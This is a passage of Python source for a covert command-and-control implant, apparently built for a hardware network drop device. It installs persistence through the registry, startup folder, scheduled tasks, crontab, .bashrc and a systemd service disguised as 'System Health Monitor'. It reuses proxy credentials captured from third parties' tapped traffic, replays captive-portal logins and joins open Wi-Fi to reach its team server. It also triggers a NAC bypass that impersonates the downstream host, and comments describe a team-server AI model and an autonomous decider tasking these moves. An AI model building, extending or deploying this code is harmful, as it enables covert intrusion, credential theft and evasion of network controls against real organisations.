                rc.write_text(content + line)
                return f"Persistence installed: ~/.bashrc"

            elif method == "systemd":
                if platform.system() == "Windows":
                    return "[error] systemd not available on Windows"
                svc_dir = Path.home() / ".config" / "systemd" / "user"
                svc_dir.mkdir(parents=True, exist_ok=True)
                svc = svc_dir / "system-health.service"
                svc.write_text(
                    f"[Unit]\nDescription=System Health Monitor\n\n"
                    f"[Service]\nExecStart={cmd_line}\nRestart=always\n"
                    f"RestartSec=30\n\n[Install]\nWantedBy=default.target\n"
                )
                subprocess.run(
                    ["systemctl", "--user", "enable", "--now", "system-health"],
                    capture_output=True, text=True, timeout=15,
                )
                return f"Persistence installed: systemd user service\n{svc}"

            else:
                return f"[error] Unknown method: {method}\nAvailable: auto, registry, startup, schtask, crontab, bashrc, systemd"

        except Exception as e:
            return f"[error] {e}"

    def _exec_unpersist(self, method: str) -> str:
        method = (method or "auto").strip().lower()
        # The same value `_exec_persist` wrote, read from the same place.
        name = self._persist_name
        if method == "auto":
            method = "registry" if platform.system() == "Windows" else "crontab"

        try:
            if method == "registry":
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE,
                )
                try:
                    winreg.DeleteValue(key, name)
                except FileNotFoundError:
                    return "No registry persistence found"
                finally:
                    winreg.CloseKey(key)
                return "Registry persistence removed"

            elif method == "startup":
                lnk = Path(os.environ.get("APPDATA", "")) / \
                    r"Microsoft\Windows\Start Menu\Programs\Startup\SystemHealth.vbs"
                if lnk.exists():
                    lnk.unlink()
                    return f"Startup persistence removed: {lnk}"
                return "No startup persistence found"

            elif method == "schtask":
                result = subprocess.run(
                    ["schtasks", "/delete", "/tn", name, "/f"],
                    capture_output=True, text=True, timeout=15,
                )
                return result.stdout.strip() or result.stderr.strip() or "Scheduled task removed"

            elif method == "crontab":
                existing = subprocess.run(
                    ["crontab", "-l"], capture_output=True, text=True, timeout=10,
                )
                if existing.returncode != 0:
                    return "No crontab found"
                marker = "# raccoon-persist"
                lines = [l for l in existing.stdout.splitlines() if marker not in l]
                subprocess.run(
                    ["crontab", "-"], input="\n".join(lines) + "\n",
                    capture_output=True, text=True, timeout=10,
                )
                return "Crontab persistence removed"

            elif method == "bashrc":
                rc = Path.home() / ".bashrc"
                if not rc.exists():
                    return "No .bashrc found"
                marker = "# raccoon-persist"
                lines = [l for l in rc.read_text().splitlines() if marker not in l]
                rc.write_text("\n".join(lines) + "\n")
                return ".bashrc persistence removed"

            elif method == "systemd":
                subprocess.run(
                    ["systemctl", "--user", "disable", "--now", "system-health"],
                    capture_output=True, text=True, timeout=15,
                )
                svc = Path.home() / ".config" / "systemd" / "user" / "system-health.service"
                if svc.exists():
                    svc.unlink()
                return "Systemd persistence removed"

            else:
                return f"[error] Unknown method: {method}"

        except Exception as e:
            return f"[error] {e}"

    def _exec_proxyinfo(self) -> str:
        lines = [f"Proxy mode: {self.proxy_mode}"]
        if self.proxy_url:
            lines.append(f"Configured URL: {self.proxy_url}")
        if self._ntlm_relay:
            lines.append("")
            lines.append("NTLM relay: active")
            lines.append(f"  Local listener: {self._ntlm_relay.url}")
            lines.append(f"  Upstream proxy: {self._ntlm_relay.upstream_url}")
            lines.append(f"  Identity:       {self._ntlm_relay.identity}")
        elif self._proxy_ntlm_cfg.get("enabled"):
            lines.append("")
            lines.append("NTLM relay: configured but not running")
        lines.append("")
        lines.append(self._proxy.summary())
        if self._proxy_session and self._proxy_session.proxies:
            lines.append("")
            lines.append("Session proxies:")
            for scheme, url in self._proxy_session.proxies.items():
                lines.append(f"  {scheme}: {url}")
        return "\n".join(lines)

    # ── Getting out ──
    #
    # Three sub-verbs under one tasking key, and with them the thing an
    # implant could not do at all until now: change how it talks. The
    # orchestrator's own tool states the limit this closes --
    # `software/agent/tools/egress.py` says nothing it queues "changes the
    # implant's proxy or its transport", and that is still true of that
    # tool -- so a team server looking at a stuck beacon's rescue record
    # had a diagnosis and two possible answers, both about timing. These
    # three are the proxy and transport answers it lacked, reached by the
    # operator and the implant's own decider rather than by that tool.
    #
    #   egress rediscover         run ProxyDiscovery again, report the list
    #   egress proxy <index|url>  make one of those candidates the active one
    #   egress gsocket            bring the carrier up now
    #
    # **None of them tests the result, and each says so.** A verb that
    # posted a probe of its own would be a second request out of a host
    # where nothing is getting out, at a moment when the reason is not yet
    # known -- and the operator's next check-in is that probe anyway. So
    # each answer says what was changed and leaves "and did it work" to
    # the leg, which reports a failure as a leg failure. The two readings
    # are the point: "I changed which proxy this implant uses" and "it
    # still cannot get out" are different things to be told, and a verb
    # that answered "proxy working" would collapse them.

    def _exec_egress(self, args: str) -> str:
        """Change how this implant gets out, or say why nothing changed."""
        parts = (args or "").strip().split(None, 1)
        action = parts[0].lower() if parts else ""
        target = parts[1].strip() if len(parts) > 1 else ""
        if action == "rediscover":
            return self._egress_rediscover()
        if action == "proxy":
            return self._egress_select_proxy(target)
        if action == "gsocket":
            return self._egress_gsocket()
        if action == "credential":
            return self._egress_credential(target)
        if action == "portal":
            return self._egress_portal()
        if action == "radio":
            return self._egress_radio(target)
        if action == "identity":
            return self._egress_identity()
        # The forms in full rather than the bare words, as `_exec_tunnel`
        # names both of its own: an operator who typed `egress transport
        # smb` needs to read what does exist, and the likeliest wrong
        # guesses are verbs the beacon really has under other keys.
        return ("[error] Unknown egress action %r: it is 'egress "
                "rediscover', 'egress proxy <index|url>', 'egress gsocket', "
                "'egress credential [index|account]', 'egress portal', "
                "'egress radio [ssid]' or 'egress identity'" % action)

    def _proxy_prohibited(self) -> bool:
        """Whether this build was told to connect directly and not to proxy.

        The same setting `_init_proxy` reads, read the same way: at
        `mode: none` that method turns `trust_env` off and logs "Proxy:
        disabled (direct connection)". That is a deliberate statement
        about how this implant talks, made by whoever generated the build,
        and an implant that then selected a proxy for itself would
        contradict an explicit instruction with nobody watching.

        Consulted by both proxy sub-verbs before anything else, so the
        prohibition binds **tasking** and not only something deciding on
        the implant's behalf: a gate that lived in a decider would leave
        the same change reachable from a queued task.
        """
        return self.proxy_mode == "none"

    def _proxy_prohibition(self, asked: str) -> str:
        """The refusal, naming the mode that refuses and what was asked for."""
        return ("[error] Not %s: this build's c2.proxy.mode is %r, which is "
                "an instruction to connect directly rather than an absence "
                "of one. Nothing was changed." % (asked, self.proxy_mode))

    def _egress_rediscover(self) -> str:
        """Run discovery again and report the list, as `proxyinfo` reports it.

        `discover_all` clears its own list on every call, so this is what
        makes a candidate list current. Nothing asks again after
        `_init_proxy`: a proxy that appeared on the host since then -- a
        `px` the operator just launched through another channel, an
        environment variable a login script set -- is invisible to a
        beacon that has been running for a week.
        """
        if self._proxy_prohibited():
            return self._proxy_prohibition("re-running proxy discovery")
        found = self._proxy.discover_all()
        # Reported through `summary()`, which is also what `proxyinfo`
        # prints and what numbers the candidates. The numbering is the
        # argument `egress proxy` takes, so there is one list and one way
        # of printing it rather than two that can drift by one.
        return ("Proxy discovery re-run: %d candidate(s)\n%s"
                % (len(found), self._proxy.summary()))

    def _egress_select_proxy(self, target: str) -> str:
        """Make a discovered proxy the active one, by its index or its URL.

        A URL is matched against what discovery found and refused when it
        is not there. An arbitrary proxy URL from tasking is the nicer
        operator affordance and the worse one for anything deciding on its
        own, and one verb cannot have two gates -- so this verb's gate is
        the discovered list, and the list is the only thing it selects
        from.
        """
        # Nothing but reading the argument happens before the gate: the
        # prohibition is consulted first so that it cannot be reached
        # around, and normalising the string here is what lets its refusal
        # name the value it was given rather than a `None` from a caller
        # that is not the dispatcher.
        target = (target or "").strip()
        if self._proxy_prohibited():
            return self._proxy_prohibition(
                "selecting %r as this implant's proxy" % target)
        if not target:
            return ("[error] 'egress proxy' takes an index or a URL from the "
                    "discovered list and was given %r; 'egress rediscover' "
                    "prints that list with its numbering" % target)

        # The last discovery, not a fresh one: an index an operator read
        # out of `rediscover` has to still mean the same candidate when
        # they send it, and a discovery in between can add or drop an
        # entry. A beacon that has never run one is the exception --
        # `_init_proxy` skips discovery at `mode: manual` and when an NTLM
        # relay came up -- because a refusal there would be a refusal for
        # a reason the operator cannot see.
        candidates = self._proxy.proxies
        discovered_now = False
        if not candidates:
            candidates = self._proxy.discover_all()
            discovered_now = True
        if not candidates:
            return ("[error] Nothing to select %r from: discovery found no "
                    "proxy on this host" % target)

        chosen = None
        if target.isdecimal():
            index = int(target)
            if not 1 <= index <= len(candidates):
                return ("[error] There is no discovered proxy %s: the list "
                        "holds %d, numbered 1 to %d. 'egress rediscover' "
                        "prints it." % (target, len(candidates),
                                        len(candidates)))
            chosen = candidates[index - 1]
        else:
            for candidate in candidates:
                if candidate.get("url") == target:
                    chosen = candidate
                    break
            if chosen is None:
                return ("[error] %r is not a proxy discovery found on this "
                        "host, and this verb selects only from that list. "
                        "What it holds:\n%s"
                        % (target, self._proxy.summary()))

        if chosen.get("is_pac"):
            # Refused for the reason `_init_proxy` filters these out
            # before it selects: a PAC file is a script that names
            # proxies, not a proxy. urllib takes `http://host/wpad.dat`
            # apart into a proxy host of `host/wpad.dat`, so the selection
            # would read as done and no request would ever leave -- the
            # one outcome this verb must not produce, since its whole
            # value is that an operator can tell what changed.
            return ("[error] %s is a PAC URL (%s), which names proxies "
                    "rather than being one, and nothing here can read it; "
                    "it cannot be selected"
                    % (chosen.get("url", target), chosen.get("source", "?")))

        # Written directly, as `_system_info` already reads it directly:
        # `ProxyDiscovery` sets this field from `select_working` and has no
        # setter, and a second way to spell "this is the active proxy"
        # would be a second thing to keep in step.
        self._proxy._active_proxy = chosen
        # A new session rather than the old one's `proxies` rewritten.
        # `_https_post` reads `_proxy_session` once into a local, so
        # swapping the object cannot change an opener a request is in the
        # middle of building; and the session being replaced carries a
        # cookie jar from a path that was not working.
        #
        # It replaces whatever the session held, including an NTLM relay's
        # local listener: on a build with `proxy.ntlm.enabled` the session
        # posts through `_NtlmProxyRelay`, and a selection here aims it at
        # an upstream proxy directly, which will very likely answer 407.
        # The verb honours the instruction it was given rather than
        # second-guessing it, and `proxyinfo` still reports the relay,
        # which is where an operator sees what they did.
        session = self._bound_session()
        self._proxy_session = session
        session.proxies = self._proxy.get_urllib_proxies() or {}
        return ("Proxy selected: %s (%s)%s. Not a test of it: the next "
                "check-in through it is, and a leg that still fails reports "
                "as that leg failing"
                % (chosen.get("url", target), chosen.get("source", "?"),
                   ", discovered just now" if discovered_now else ""))

    def _egress_gsocket(self) -> str:
        """Bring the carrier up now, instead of waiting for the latch.

        Through `_gsocket_start` and nothing else: it is idempotent, it
        holds the restart delay and the latched binary problem, and a
        second place in this process that spawned a `gs-netcat` is exactly
        what `carrier.py` and `supervisor.py` each say about themselves
        not to be.
        """
        if not self.gsocket_enabled:
            # Answered here rather than by `_gsocket_start`, which returns
            # False for this case and three others. A build generated
            # before this leg existed, or one that ships it disabled, is
            # by far the likeliest reason an operator gets a refusal from
            # this verb, and "the carrier did not start" is not something
            # they can act on.
            return ("[error] This build has no gsocket leg to start: "
                    "gsocket_enabled is %r, so there is no carrier and "
                    "nothing was changed" % self.gsocket_enabled)
        running = self._gsocket_proc
        already = running is not None and running.poll() is None
        if not self._gsocket_start():
            return ("[error] The carrier did not start: %s"
                    % (self._gsocket_problem
                       or "nothing was latched, so it is the %ds restart "
                          "delay since the last start, or this host "
                          "refusing another process"
                          % self.gsocket_restart_delay_seconds))
        proc = self._gsocket_proc
        pid = proc.pid if proc is not None else 0
        if already:
            return ("Carrier already up: pid %d, forward on 127.0.0.1:%d. "
                    "Not a test of the leg: the next check-in through the "
                    "forward is"
                    % (pid, self.gsocket_local_port))
        return ("Carrier started: pid %d, forward on 127.0.0.1:%d. Not a "
                "test of the leg: the next check-in through the forward is"
                % (pid, self.gsocket_local_port))

    # ── Rung 2: borrow what the host proves works ──
    #
    # Two verbs the tap made possible. Both read `way_out_borrow.json`,
    # which the scout writes 0600 and which is the only file here that can
    # carry a secret -- which is why it is not the document the beacon
    # reads every cycle. Neither tests its own result.

    def _egress_borrow(self, what: str) -> Tuple[Optional[dict], str]:
        """The scout's private half, or a refusal naming what is missing."""
        if not self._way_out_state_dir:
            return None, ("[error] Not borrowing %s: c2.way_out is off on "
                          "this build, so no scout is watching the tapped "
                          "port and there is nothing to borrow. Nothing was "
                          "changed." % what)
        loaded = self._way_out_read(_WAY_OUT_BORROW_NAME,
                                    _WAY_OUT_BORROW_VERSION)
        if loaded is None:
            return None, ("[error] Not borrowing %s: the scout's %s is "
                          "missing, unreadable, or of a version this "
                          "implant does not know. Nothing was changed."
                          % (what, _WAY_OUT_BORROW_NAME))
        return loaded, ""

    def _egress_credential(self, target: str) -> str:
        """Borrow a credential the host handed over in the clear.

        What it changes: the proxy this implant posts through, and the
        account it authenticates as. That is the answer to a `407` -- the
        one failure class the rescue record carries that nothing in this
        implant could previously act on.

        **The secret is never printed.** The answer names the account and
        the proxy, because that is what an operator needs to recognise what
        the implant did and what may lock out.
        """
        if self._proxy_prohibited():
            return self._proxy_prohibition(
                "borrowing a credential the tap captured")
        borrow, refusal = self._egress_borrow("a credential")
        if borrow is None:
            return refusal
        entries = [entry for entry in (borrow.get("credentials") or [])
                   if isinstance(entry, dict)]
        usable = [entry for entry in entries
                  if entry.get("secret") and entry.get("user")
                  and entry.get("where")]
        if not usable:
            # Said as what it is. An NTLM or Negotiate header is a
            # challenge-response and carries no password to borrow, so a
            # verb that selected one would spend an attempt on a
            # credential with an empty secret.
            kinds = sorted({str(entry.get("kind", "?")) for entry in entries})
            return ("[error] Not borrowing a credential: the scout has "
                    "captured %d, none of them usable%s. A proxy-NTLM or "
                    "proxy-Negotiate header is a challenge-response and "
                    "carries no password. Nothing was changed."
                    % (len(entries),
                       " (" + ", ".join(kinds) + ")" if kinds else ""))

        chosen = None
        if not target:
            chosen = usable[0]
        elif target.isdecimal():
            index = int(target)
            if not 1 <= index <= len(usable):
                return ("[error] There is no usable credential %s: the scout "
                        "has %d, numbered 1 to %d."
                        % (target, len(usable), len(usable)))
            chosen = usable[index - 1]
        else:
            for entry in usable:
                if entry.get("user") == target:
                    chosen = entry
                    break
            if chosen is None:
                return ("[error] %r is not an account the scout captured, "
                        "and this verb selects only from what it did. "
                        "Nothing was changed." % target)

        # The proxy as a bare URL, and the credential as a header.
        #
        # **Not userinfo in the URL**, which is where this first put it:
        # `_system_info` reports the active proxy to the team server on
        # every check-in and `_exec_proxyinfo` prints it, so a password in
        # the URL was persisted in the server's database and rendered in
        # its panel. The credential belongs to a third party and was
        # captured from their traffic; it does not leave the device.
        url = "http://%s" % chosen["where"]
        token = base64.b64encode(
            ("%s:%s" % (chosen["user"], chosen["secret"]))
            .encode("utf-8")).decode()
        # A new session rather than the old one's `proxies` rewritten, for
        # the reason `_egress_select_proxy` gives: `_https_post` reads
        # `_proxy_session` once into a local, so swapping the object cannot
        # change an opener a request is in the middle of building.
        session = self._bound_session()
        self._proxy_session = session
        session.proxies = {"http": url, "https": url}
        session.headers["Proxy-Authorization"] = "Basic " + token
        return ("Credential borrowed: this implant now posts through %s as "
                "%s (%s, seen by the scout on the tapped port). Not a test "
                "of it: the next check-in through that proxy is"
                % (chosen["where"], chosen["user"], chosen["kind"]))

    def _egress_portal(self) -> str:
        """Answer a captive portal the way the host answered it.

        One request, replaying exactly what the scout saw the host send and
        get past. It reports the status it got and nothing more: a portal
        that answers 200 has not proved this implant can reach the team
        server, and the next check-in is what does.
        """
        borrow, refusal = self._egress_borrow("a captive portal's answer")
        if borrow is None:
            return refusal
        portal = borrow.get("portal")
        if not isinstance(portal, dict):
            return ("[error] Not answering a captive portal: the scout has "
                    "not seen the host get past one, so there is nothing to "
                    "replay. Nothing was changed.")
        url = portal.get("url")
        body = portal.get("body")
        if (not isinstance(url, str) or not url.startswith("http://")
                or not isinstance(body, str)):
            return ("[error] Not answering a captive portal: the scout's "
                    "record of it is %r, which this verb cannot replay. "
                    "Nothing was changed." % (portal,))
        content_type = portal.get("content_type") or \
            "application/x-www-form-urlencoded"
        session = self._proxy_session or self._bound_session()
        try:
            response = session.post_raw(
                url, body.encode("utf-8"),
                {"Content-Type": content_type}, timeout=20)
        except Exception as exc:
            return ("[error] The captive portal at %s could not be answered: "
                    "%s. Nothing was changed." % (url, exc))
        return ("Captive portal answered at %s, as the host answered it; it "
                "replied %d. Not a test of the way out: the next check-in is"
                % (url, response.status_code))

    # ── Rung 3: the implant's own radio ──
    #
    # An open SSID, which leaves the tapped port altogether. Three bounds,
    # and each is in the code below rather than in a comment: the **onboard**
    # radio only, because a USB adapter is refused on the 13 W power budget
    # (`hardware/OPEN_QUESTIONS.md:184`); a **time-boxed** association; and
    # a **scoped** route -- a table of its own plus a source rule -- so that
    # this never becomes the host's default route. An implant that stranded
    # itself off the path it still has is the predecessor design's hardest
    # anti-goal, which is why a failure rolls back every command it ran.

    # Its own routing table and nothing else's. 100 because the kernel's own
    # names stop at 255 and local/main/default occupy 255/254/253.
    _RADIO_TABLE = "100"
    # The association and the lease, each in seconds. Short on purpose: this
    # runs on the beacon thread, and a `dhclient` that never returned would
    # cost the implant its loop.
    _RADIO_TIMEOUT = 30

    def _radio_run(self, argv: List[str], timeout: int = 30):
        """One command, as `(returncode, output)`. Never raises.

        The seam the radio rung is tested through, and the shape
        `nac_bypass.py` already runs its own `ebtables` and `ip` with.
        """
        try:
            done = subprocess.run(argv, capture_output=True, text=True,
                                  timeout=timeout)
        except (OSError, subprocess.SubprocessError) as exc:
            return 1, str(exc)
        return done.returncode, (done.stdout or "") + (done.stderr or "")

    def _radio_iface(self) -> Tuple[Optional[str], str]:
        """The onboard wireless interface, or None and why not.

        USB is refused rather than preferred, and the reason is the power
        budget rather than tidiness: 802.3af gives this device about 13 W
        and it is already bridging and capturing. Raspberry Pi's own note
        on that class of HAT says it is not quite enough to power the
        hungriest USB peripherals at the same time, and
        `hardware/OPEN_QUESTIONS.md` adds: this board is that case.
        """
        usb = []
        try:
            names = sorted(os.listdir(_SYSFS_NET))
        except OSError as exc:
            return None, "the interface list could not be read: %s" % exc
        for name in names:
            iface = os.path.join(_SYSFS_NET, name)
            if not os.path.exists(os.path.join(iface, "wireless")):
                continue
            device = os.path.realpath(os.path.join(iface, "device"))
            if "usb" in device.lower():
                usb.append(name)
                continue
            return name, ""
        if usb:
            return None, ("%s is a USB adapter and the 13 W PoE budget "
                          "refuses one: this device is already bridging and "
                          "capturing on it" % ", ".join(usb))
        return None, "no wireless interface on this host"

    def _egress_radio(self, target: str) -> str:
        """Associate with an open SSID and route this implant's own traffic.

        The SSIDs come from the scout's document -- the radio is the scout's
        to scan, and a beacon that scanned for itself would be a second
        reader of the same hardware. Without a fresh document there is
        nothing to associate with and the verb declines.
        """
        iface, problem = self._radio_iface()
        if iface is None:
            return ("[error] Not using this implant's own radio: %s. Nothing "
                    "was changed." % problem)
        document = self._way_out_document()
        if document is None:
            return ("[error] Not using this implant's own radio: there is no "
                    "fresh scout document, so no SSID has been seen. "
                    "Nothing was changed.")
        seen = [entry for entry in
                ((document.get("tap") or {}).get("ssids") or [])
                if isinstance(entry, dict) and entry.get("ssid")]
        openly = [entry["ssid"] for entry in seen if entry.get("open")]
        if target:
            if target not in openly:
                return ("[error] %r is not an SSID the scout saw open: it "
                        "saw %s. This verb associates with an open network "
                        "only -- there is no credential here for a closed "
                        "one. Nothing was changed."
                        % (target, ", ".join(
                            "%s (%s)" % (e["ssid"],
                                         "open" if e.get("open") else "closed")
                            for e in seen) or "none"))
            ssid = target
        elif openly:
            ssid = openly[0]
        else:
            return ("[error] Not using this implant's own radio: the scout "
                    "saw %s and none of them open. Nothing was changed."
                    % (", ".join(entry["ssid"] for entry in seen) or "no "
                       "SSID at all"))

        def step(argv):
            code, output = self._radio_run(argv, timeout=self._RADIO_TIMEOUT)
            if code != 0:
                return output or ("%s exited %d" % (argv[0], code))
            return ""

        failure = step(["ip", "link", "set", iface, "up"])
        if failure:
            return self._radio_rollback(
                iface, None, "%s could not be brought up: %s"
                % (iface, failure))

        failure = step(["iw", "dev", iface, "connect", ssid])
        if failure:
            return self._radio_rollback(
                iface, None, "the association with %r failed: %s"
                % (ssid, failure))

        # Under the state directory and nowhere else: a lease names the
        # host's own network, and `_egress_radio` is unreachable without
        # `c2.way_out`, so there is no case needing a `/tmp` fallback --
        # which is the one place this design refuses to put a file.
        lease = self._way_out_path(_WAY_OUT_RADIO_LEASE_NAME)
        # `-1` is one attempt and then give up, and `-sf /bin/true` is the
        # whole point: dhclient's default script installs a **default
        # route**, which is the one thing this rung may never do.
        failure = step(["dhclient", "-1", "-sf", "/bin/true", "-lf", lease,
                        iface])
        if failure:
            return self._radio_rollback(
                iface, None, "DHCP on %s failed: %s" % (iface, failure))
        address, prefix, router = _radio_lease(lease)
        if not address or not router:
            return self._radio_rollback(
                iface, None, "the DHCP lease named no address and gateway "
                             "this rung could use")

        # `replace` and not `add`, here and for the route below. A second
        # attempt is the ordinary case -- no verb tests its own result --
        # and `add` answers "File exists", which used to roll the working
        # association back on top of itself. **Not `addr flush` either**,
        # which was the first fix for that and was worse: it deletes every
        # address on the onboard radio, including an operator's management
        # address, and nothing can put that back.
        failure = step(["ip", "addr", "replace", "%s/%d" % (address, prefix),
                        "dev", iface])
        if failure:
            return self._radio_rollback(
                iface, None, "%s could not be given %s: %s"
                % (iface, address, failure))

        failure = step(["ip", "route", "replace", "default", "via", router,
                        "dev", iface, "table", self._RADIO_TABLE])
        if failure:
            return self._radio_rollback(
                iface, address, "the scoped route could not be installed: %s"
                % failure, prefix=prefix)
        # `ip rule` has no `replace` and stacks silently, so the rule is
        # removed before it is added. A delete of a rule that is not there
        # is a non-zero exit and nothing else.
        step(["ip", "rule", "del", "from", address, "table",
              self._RADIO_TABLE])
        failure = step(["ip", "rule", "add", "from", address, "table",
                        self._RADIO_TABLE])
        if failure:
            return self._radio_rollback(
                iface, address, "the source rule could not be installed: %s"
                % failure, prefix=prefix)
        # And the thing that makes the rule mean something: every socket
        # this implant opens from now on leaves by that address, so the
        # rule matches and the table-100 route is the one taken. Without
        # this the rung installed a route nothing could ever select.
        self._way_out_bind(address)
        # The lease stays, in the 0700 directory with the rest of the
        # handoff, and it is not litter: it is the only record of which
        # address this rung's source rule was installed for that survives
        # a restart of this process, so a later rollback can remove a rule
        # it did not install. See `_radio_lease_address`.
        return ("Radio associated: %s on %s as %s, with its default route in "
                "table %s and a source rule for %s -- this implant's own "
                "traffic only, and never the host's. Not a test of the way "
                "out: the next check-in is"
                % (ssid, iface, address, self._RADIO_TABLE, address))

    def _radio_rollback(self, iface: str, address: Optional[str],
                        problem: str, prefix: int = 24) -> str:
        """Undo the whole rung, not only this attempt's steps, and say why.

        Part of the rung and not a follow-up: a half-configured radio is
        an interface with an address and no route, which is a change the
        operator cannot see and cannot undo from the far side.

        **Everything the rung could have installed, whether or not this
        attempt installed it.** It used to undo only its own steps, so a
        failure early in a second attempt left the first attempt's source
        rule and its table-100 route behind. The commands are idempotent:
        deleting a rule that is not there is a non-zero exit and nothing
        else, and `_radio_run` reports rather than raises.
        """
        self._radio_run(["ip", "route", "flush", "table", self._RADIO_TABLE],
                        timeout=self._RADIO_TIMEOUT)
        for candidate in [address] + self._radio_lease_address(address):
            if candidate:
                self._radio_run(["ip", "rule", "del", "from", candidate,
                                 "table", self._RADIO_TABLE],
                                timeout=self._RADIO_TIMEOUT)
        if address:
            self._radio_run(["ip", "addr", "del", "%s/%d" % (address, prefix),
                             "dev", iface], timeout=self._RADIO_TIMEOUT)
        self._radio_run(["iw", "dev", iface, "disconnect"],
                        timeout=self._RADIO_TIMEOUT)
        self._radio_run(["ip", "link", "set", iface, "down"],
                        timeout=self._RADIO_TIMEOUT)
        self._way_out_bind("")
        return ("[error] Not using this implant's own radio: %s. Every step "
                "the rung could have taken has been rolled back and %s is "
                "down." % (problem, iface))

    def _way_out_bind(self, address: str) -> None:
        """Pin every socket this implant opens to `address`, or unpin them.

        The other half of the radio rung's scoped route. `ip rule from
        <address>` matches only packets whose source is that address, and
        a locally-generated connection has no source until it is bound --
        so the rule and the route were unreachable and the rung changed
        nothing while reporting that it had.

        The HTTP session is replaced rather than mutated, for the reason
        `_egress_select_proxy` gives: `_https_post` reads
        `_proxy_session` once into a local, so swapping the object cannot
        change an opener a request is in the middle of building.
        """
        self._way_out_source = address or ""
        session = self._bound_session()
        previous = self._proxy_session
        if previous is not None:
            session.proxies = dict(previous.proxies)
            session.headers = dict(previous.headers)
            session.trust_env = previous.trust_env
        self._proxy_session = session

    def _bound_session(self) -> "_HttpSession":
        """A fresh HTTP session that still leaves by the leased address.

        The invariant `_way_out_bind` installs has exactly one owner, and
        this is it: **while the radio rung holds a lease, every socket this
        implant opens for its own traffic leaves by that address.** Five
        places build a fresh session -- a proxy selected, a credential
        borrowed, a portal answered with no session yet, a direct retry
        after a proxy refused us, and the startup path -- and each of them
        set the one or two fields it cared about on a bare `_HttpSession`.
        Three of the five therefore dropped `source_address` silently,
        while `_way_out_source` went on claiming the bind and the rung's
        own log line went on saying "this implant's own traffic only": HTTP
        left by the dead tapped port, which is the failure the rung exists
        to end.

        Only the source address, and nothing else of the old session: the
        callers that reach for this are switching the path out, the cookie
        jar is state from the path being left behind, and `headers` may
        hold a third party's `Proxy-Authorization` -- which a direct retry
        must not carry to the team server. A field that must survive a
        path switch belongs here, where adding it reaches all five.

        The one deliberate exception is the loopback forward in
        `_https_post`, which builds a bare session: a connection to
        `127.0.0.1` from a radio lease's address cannot be made at all.
        """
        session = _HttpSession()
        if self._way_out_source:
            session.source_address = (self._way_out_source, 0)
        return session

    def _radio_lease_address(self, already) -> List[str]:
        """The address a previous attempt's lease named, if it is still there.

        So a rollback can remove a source rule this attempt never
        installed. The lease is the only record of it that survives a
        restart of this process.
        """
        if not self._way_out_state_dir:
            return []
        address, _prefix, _router = _radio_lease(
            self._way_out_path(_WAY_OUT_RADIO_LEASE_NAME))
        return [address] if address and address != already else []

    # ── Rung 4: take an identity, which this repository already does ──

    def _egress_identity(self) -> str:
        """Ask `main.py` to start the NAC bypass it already carries.

        A trigger and not an implementation: `software/nac_bypass.py`
        forwards EAPOL so the downstream device stays authenticated, learns
        its MAC, IP and the gateway's MAC from the bridge, and originates
        this implant's traffic under that identity. It ships disabled and
        runs as a component of `main.py`, which is a **different process**
        from this one -- so this writes one request file and that process
        acts on it.

        **One-shot per deployment.** A move that can turn the port off does
        not get retried on a hunch, however the arithmetic looks on the next
        cycle, and `_leg_recovered` deliberately does not re-arm it.

        **And one-shot across restarts of this process**, which is what the
        request file on the disk is for. The flag below starts from that
        file rather than from False, and this reads it again before writing:
        the record carries `taken` and `detail` once `main.py` has acted,
        which is the only durable statement that the bypass was started, so
        a second request must not overwrite it.

        **Pre-spent when the operator already enabled the bypass**: the
        identity was taken at boot, and offering the rung again would spend
        an attempt on something already done.
        """
        if self._way_out_identity_spent or self._way_out_read(
                _WAY_OUT_IDENTITY_NAME, _WAY_OUT_STATE_VERSION) is not None:
            self._way_out_identity_spent = True
            return ("[error] Not taking the host's identity: this implant "
                    "has asked once already, and the rung is once per "
                    "deployment -- it is the one move that can end this "
                    "implant's connectivity for good. Nothing was changed.")
        document = self._way_out_document()
        if document is None:
            return ("[error] Not taking the host's identity: there is no "
                    "fresh scout document, and whether the bypass is "
                    "already running is a fact only the scout reads. The "
                    "safe answer to an unknown is not to make the one "
                    "irreversible move. Nothing was changed.")
        if document.get("identity_pre_spent"):
            return ("[error] Not taking the host's identity: this build's "
                    "nac_bypass.enabled is true, so the identity was taken "
                    "at boot and the rung is already spent. Nothing was "
                    "changed.")
        self._way_out_identity_spent = True
        self._way_out_write(_WAY_OUT_IDENTITY_NAME, {
            "version": _WAY_OUT_STATE_VERSION,
            "requested": time.time(),
            "stuck_cycles": self._stuck_cycles,
        })
        return ("Identity requested: the implant has asked its own main "
                "process to start nac_bypass, which forwards EAPOL and then "
                "originates this implant's traffic as the downstream host. "
                "Once per deployment. Not a test of the way out: the next "
                "check-in is")

    # ── Deciding to get out, when nobody can be asked ──

    #
    # The three verbs above are what an operator, or the team server's
    # model through `try_egress`, sends a stuck implant. This is what the
    # implant does with them when the thing that decides cannot be
    # reached -- which is the case the rescue record exists to report, and
    # the one case where reporting it is not enough, because
    # `software/agent/tools/egress.py` sits on the far side of exactly the
    # connection being established.
    #
    # It is for that and nothing else. Four bounds, and not one of them
    # is in the configuration file:
    #
    #   * **the verbs are the three above.** A policy chooses from
    #     `EGRESS_VERBS` and orders it and cannot add to it, which is why
    #     `sleep` -- the one verb the server-side model reaches for on a
    #     stuck beacon -- is unavailable here: an implant that can slow
    #     its own check-ins with nobody to ask can talk itself into
    #     silence.
    #   * **not on the first stuck cycle.** The operator's decision: when
    #     the server can be reached, the server decides. See
    #     `_EGRESS_FIRST_ACTING_CYCLE`.
    #   * **one attempt per cycle, never a sweep** -- `egress.py`'s own
    #     rule, for its reason: a dozen attempts from a device
    #     impersonating an IP phone is louder than the single short query
    #     that reported the problem. The next cycle re-reads the evidence,
    #     which has changed if the attempt worked.
    #   * **a budget per stuck window**, after which this is silent and
    #     the rescue record does its job. Going quiet is not giving up: it
    #     is handing the decision back to a team server that can still act
    #     the moment DNS reaches it.
    #
    # **Nothing here reports upstream, and that is settled rather than
    # missing.** By the time the decider may act the rescue record has
    # been sent -- `_maybe_rescue` is one query per window -- so there is
    # no message left to attach the news to, and a second record would
    # make the rescue periodic, which `_beacon_loop`'s own comment records
    # as a defect that was measured and fixed. So each attempt writes one
    # line to this beacon's log, which the operator reads with the `cat`
    # verb once there is a connection, or on a recovered device. That is
    # the only state in which the detail could reach them anyway.

    # The stuck cycle from which an attempt may be made, counting the
    # cycle that discovers the outage as 1. **Two**, and it is the
    # operator's decision rather than a tuning value: acting on the first
